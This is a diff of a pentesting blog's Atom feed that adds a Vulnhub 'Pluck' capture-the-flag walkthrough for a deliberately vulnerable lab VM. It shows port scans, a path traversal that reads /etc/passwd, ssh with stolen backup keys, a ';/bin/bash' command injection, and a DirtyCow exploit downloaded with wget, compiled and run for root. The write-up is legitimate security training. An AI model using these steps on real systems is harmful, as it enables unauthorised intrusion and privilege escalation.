@@ -1,4 +1,241 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-22T09:17:45+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Billy Madison 1.1</title><link href="http://localhost:4000/vulnhub-billy-madison/" rel="alternate" type="text/html" title="Vulnhub.com - Billy Madison 1.1" /><published>2017-03-19T02:00:00+00:00</published><updated>2017-03-19T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-billy-madison</id><content type="html" xml:base="http://localhost:4000/vulnhub-billy-madison/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-26T07:01:21+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Pluck</title><link href="http://localhost:4000/vulnhub-pluck/" rel="alternate" type="text/html" title="Vulnhub.com - Pluck" /><published>2017-03-26T02:00:00+00:00</published><updated>2017-03-26T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-pluck</id><content type="html" xml:base="http://localhost:4000/vulnhub-pluck/">&lt;h1&gt;Introduction&lt;/h1&gt;
+
+&lt;p&gt;In this post we're going to work on a short, but still great machine from &lt;b&gt;Vulnhub&lt;/b&gt; called &lt;a href=&quot;https://www.vulnhub.com/entry/pluck-1,178/&quot;&gt;&lt;b&gt;Pluck&lt;/b&gt;&lt;/a&gt;. Let's start! &lt;/p&gt;
+
+&lt;h1&gt;Write-Up&lt;/h1&gt;
+
+&lt;p&gt;Our Pluck machine was assigned with &lt;b&gt;10.0.2.6&lt;/b&gt; IP address, so firstly we have to scan it in order to check any open ports. As always, &lt;b&gt;Nmap&lt;/b&gt; is our best friend.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -T4 -A -v -p 0-65535 10.0.2.6
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-25 12:39 EDT
+NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 12:39
+Completed NSE at 12:39, 0.00s elapsed
+Initiating NSE at 12:39
+Completed NSE at 12:39, 0.00s elapsed
+Initiating ARP Ping Scan at 12:39
+Scanning 10.0.2.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
+Completed ARP Ping Scan at 12:39, 0.02s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Parallel DNS resolution of 1 host. at 12:39
+Completed Parallel DNS resolution of 1 host. at 12:39, 6.67s elapsed
+Initiating SYN Stealth Scan at 12:39
+Scanning 10.0.2.6 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65536 ports]
+Discovered open port 80/tcp on 10.0.2.6
+Discovered open port 3306/tcp on 10.0.2.6
+Discovered open port 22/tcp on 10.0.2.6
+Discovered open port 5355/tcp on 10.0.2.6
+Completed SYN Stealth Scan at 12:39, 4.53s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65536 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating Service scan at 12:39
+Scanning 4 services on 10.0.2.6
+Completed Service scan at 12:41, 110.26s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 services on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 10.0.2.6&lt;/span&gt;
+NSE: Script scanning 10.0.2.6.
+Initiating NSE at 12:41
+Completed NSE at 12:41, 7.62s elapsed
+Initiating NSE at 12:41
+Completed NSE at 12:41, 0.01s elapsed
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.6
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 65532 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey:
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp   open  http    Apache httpd 2.4.18 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unauthorized&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+5355/tcp open  unknown
+MAC Address: 08:00:27:45:29:54 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Device &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+Uptime guess: 0.002 days &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;since Sat Mar 25 12:39:21 2017&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Network Distance: 1 hop
+TCP Sequence Prediction: &lt;span class=&quot;nv&quot;&gt;Difficulty&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;259 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Good luck!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.76 ms 10.0.2.6
+
+NSE: Script Post-scanning.
+Initiating NSE at 12:41
+Completed NSE at 12:41, 0.00s elapsed
+Initiating NSE at 12:41
+Completed NSE at 12:41, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;132.02 seconds
+           Raw packets sent: 65559 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.885MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | Rcvd: 65558 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2.623MB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, we can now check the website running at port &lt;b&gt;80&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/first-look.png&quot; alt=&quot;First Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Really simple, but with potential components to exploit, like admin panel. In addition, we can see that the &lt;b&gt;about&lt;/b&gt; page may contain some clues. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/about.png&quot; alt=&quot;About&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Before further looking, let's fire up &lt;b&gt;Nikto&lt;/b&gt; scan. Maybe it will show us the way?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.6
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.6
++ Target Hostname:    10.0.2.6
++ Target Port:        80
++ Start Time:         2017-03-22 08:46:22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
++ /index.php?page&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;probably Rocket, but could be any index.php&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ OSVDB-29786: /admin.php?en_log_id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&amp;amp;action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-29786: /admin.php?en_log_id&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&amp;amp;action&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
++ OSVDB-3092: /admin.php: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3268: /images/?pattern&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&amp;amp;sort&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;name: Directory indexing found.
++ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7535 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 12 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-03-22 08:46:43 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;21 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;b&gt;File Traversal&lt;/b&gt; vulnerability? Great, we can take a look at &lt;b&gt;/etc/passwd&lt;/b&gt; file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/passwd.png&quot; alt=&quot;Passwd&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After looking at the source code we can see it in plain format, not in this... something. What got me interested is the &lt;b&gt;entry for backup user&lt;/b&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Maybe we can further exploit vulnerability and view &lt;b&gt;backup.sh&lt;/b&gt; script?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/backup.png&quot; alt=&quot;Backup&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome! We know that backups are available via &lt;b&gt;tftp&lt;/b&gt; so let's connect and download them. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;tftp 10.0.2.6
+&lt;span class=&quot;gp&quot;&gt;tftp&amp;gt; &lt;/span&gt;get backup.tar
+Received 1824718 bytes &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.1 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After unpacking it, I wondered around a few directories, finally finding &lt;b&gt;ssh&lt;/b&gt; keys in &lt;b&gt;/home/paul/keys&lt;/b&gt; directory. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/keys.png&quot; alt=&quot;Keys&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we have to test which key is valid. After a few moments I've found that the working one is &lt;b&gt;id_key4&lt;/b&gt;. Remember to set proper permissions! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents/backup/home/paul/keys# &lt;/span&gt;chmod 600 id_key4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And now let's log in using &lt;b&gt;ssh&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents/backup/home/paul/keys# &lt;/span&gt;ssh -i id_key4 paul@10.0.2.6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmm... That's a little different from normal screen you see after log in. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/pdmenu.png&quot; alt=&quot;Pdmenu&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here, I decided to perform &lt;b&gt;Command Injection&lt;/b&gt; and try to get bash shell by typing &lt;b&gt;;/bin/bash&lt;/b&gt;. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/pluck/bash.png&quot; alt=&quot;Pdmenu Bash&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We have the paul's shell! &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~/Documents/backup/home/paul/keys# &lt;/span&gt;ssh -i id_key4 paul@10.0.2.6
+Last login: Sat Mar 25 18:53:58 2017 from 10.0.2.15
+&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;paul&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;paul&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;paul&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Press Enter to &lt;span class=&quot;k&quot;&gt;return &lt;/span&gt;to Pdmenu.
+paul@pluck:~&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now, last part - privilage escalation. Let's firstly see, which version of Linux kernel we're running. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;paul@pluck:~$ &lt;/span&gt;uname -a
+Linux pluck 4.8.0-22-generic &lt;span class=&quot;c&quot;&gt;#24-Ubuntu SMP Sat Oct 8 09:15:00 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Linux 4.8? &lt;a href=&quot;https://dirtycow.ninja/&quot;&gt;&lt;b&gt;DirtyCow&lt;/b&gt;&lt;/a&gt; should work against this kind of kernel. We will firstly download it, compile and hopefully it will give us root. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;paul@pluck:~$ &lt;/span&gt;wget https://www.exploit-db.com/download/40616
+--2017-03-25 19:14:29--  https://www.exploit-db.com/download/40616
+Resolving www.exploit-db.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.exploit-db.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;... 192.124.249.8
+Connecting to www.exploit-db.com &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www.exploit-db.com&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;|192.124.249.8|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4965 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4.8K&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;application/txt]
+Saving to: ‘40616’
+
+40616               100%[&lt;span class=&quot;o&quot;&gt;===================&lt;/span&gt;&amp;gt;]   4.85K  --.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0s      
+
+2017-03-25 19:14:30 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;149 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘40616’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;4965/4965]
+
+&lt;span class=&quot;gp&quot;&gt;paul@pluck:~$ &lt;/span&gt;mv 40616 dirtycow.c
+&lt;span class=&quot;gp&quot;&gt;paul@pluck:~$ &lt;/span&gt;gcc dirtycow.c -o  dirtycow -pthread
+dirtycow.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘procselfmemThread’:
+dirtycow.c:99:17: warning: passing argument 2 of ‘lseek’ makes integer from pointer without a cast &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-Wint-conversion]
+         lseek&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;f,map,SEEK_SET&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+                 ^~~
+In file included from dirtycow.c:28:0:
+/usr/include/unistd.h:337:16: note: expected ‘__off_t &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;aka long int&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;’ but argument is of &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ‘void &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;’
+ extern __off_t lseek &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;int __fd, __off_t __offset, int __whence&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; __THROW;
+                ^~~~~
+dirtycow.c: In &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘main’:
+dirtycow.c:136:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘asprintf’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-Wimplicit-function-declaration]
+     asprintf&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&amp;amp;backup, &lt;span class=&quot;s2&quot;&gt;&quot;cp %s /tmp/bak&quot;&lt;/span&gt;, suid_binary&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+     ^~~~~~~~
+dirtycow.c:140:5: warning: implicit declaration of &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt; ‘fstat’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-Wimplicit-function-declaration]
+     fstat&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;f,&amp;amp;st&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+     ^~~~~
+dirtycow.c:142:30: warning: format ‘%d’ expects argument of &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ‘int’, but argument 2 has &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; ‘__off_t &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;aka long int&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;’ &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-Wformat&lt;span class=&quot;o&quot;&gt;=]&lt;/span&gt;
+     &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Size of binary: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;, st.st_size&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;;
+                              ^
+&lt;span class=&quot;gp&quot;&gt;paul@pluck:~$ &lt;/span&gt;./dirtycow
+DirtyCow root privilege escalation
+Backing up /usr/bin/passwd.. to /tmp/bak
+Size of binary: 54256
+Racing, this may take a &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;..
+thread stopped
+/usr/bin/passwd is overwritten
+Popping root shell.
+Dont forget to restore /tmp/bak
+thread stopped
+&lt;span class=&quot;gp&quot;&gt;root@pluck:/home/paul# &lt;/span&gt;cat /root/flag.txt
+
+Congratulations you found the flag
+
+---------------------------------------
+
+&lt;span class=&quot;c&quot;&gt;######   ((((((((((((((((((((((((((((((&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#########   (((((((((((((((((((((((((((&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;,,##########   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((((((((((((((((((((((((&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;@@,,,##########   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(((((((((((((((((((((&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;@@@@@,,,##########                     &lt;/span&gt;
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+&lt;span class=&quot;gp&quot;&gt;@@@@@@,,,##########                    &lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;@@@,,,##########   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;span class=&quot;gp&quot;&gt;,,,##########   &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&lt;/span&gt;&amp;amp;
+&lt;span class=&quot;c&quot;&gt;##########   &amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#######   &amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&amp;amp;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Amazing, we have the flag! &lt;/p&gt;
+
+&lt;h1&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;It was nice little challenge with little dose of suprises. Thanks &lt;a href=&quot;https://twitter.com/@ryanoberto&quot;&gt;&lt;b&gt;Ryan Oberto&lt;/b&gt;&lt;/a&gt; for creating this great challenge, &lt;a href=&quot;https://www.vulnhub.com/&quot;&gt;&lt;b&gt;Vulnhub&lt;/b&gt;&lt;/a&gt; for hosting and &lt;b&gt;Yodak#2187&lt;/b&gt; for joining!  &lt;/p&gt;
+
+&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Vulnhub" /><summary type="html">Introduction</summary></entry><entry><title type="html">Vulnhub.com - Billy Madison 1.1</title><link href="http://localhost:4000/vulnhub-billy-madison/" rel="alternate" type="text/html" title="Vulnhub.com - Billy Madison 1.1" /><published>2017-03-19T02:00:00+00:00</published><updated>2017-03-19T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-billy-madison</id><content type="html" xml:base="http://localhost:4000/vulnhub-billy-madison/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
 &lt;p&gt;Today we're going to try and root another machine from Vulnhub called &lt;a href=&quot;https://www.vulnhub.com/entry/billy-madison-11,161/&quot;&gt;&lt;b&gt;Billy Madison&lt;/b&gt;&lt;/a&gt;. Our objective is to figure out how Eric took over the machine, undo his changes and recover Billy's 12th grade final project. Sounds great! &lt;/p&gt;
 
@@ -2455,79 +2692,4 @@ $ cat /etc/narnia_pass/narnia2&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&
 &lt;p&gt;&lt;b&gt;UPDATE&lt;/b&gt;&lt;/p&gt;
 &lt;p&gt;To gain better insight into who visits my website, I decided to add Piwik Analytics as a way to both give me essential information, and to repsect your privacy. You can read more at the &lt;a href=&quot;/privacy/&quot;&gt;Privacy Policy&lt;/a&gt;, but if you still have any questions, contact me and I'll try my best to answer. &lt;/p&gt;
 
-&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Overthewire" /><summary type="html">Introduction Another month, another challenge, next part of OverTheWire's Narnia wargames. Unfortunately lack of time, made it impossible for me to publish anything sooner. Sorry for that!</summary></entry><entry><title type="html">Overthewire.org - Narnia 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire.org-narnia-1/" rel="alternate" type="text/html" title="Overthewire.org - Narnia 0 -&gt; 1" /><published>2017-01-01T00:00:00+00:00</published><updated>2017-01-01T00:00:00+00:00</updated><id>http://localhost:4000/overthewire.org-narnia-1</id><content type="html" xml:base="http://localhost:4000/overthewire.org-narnia-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
-
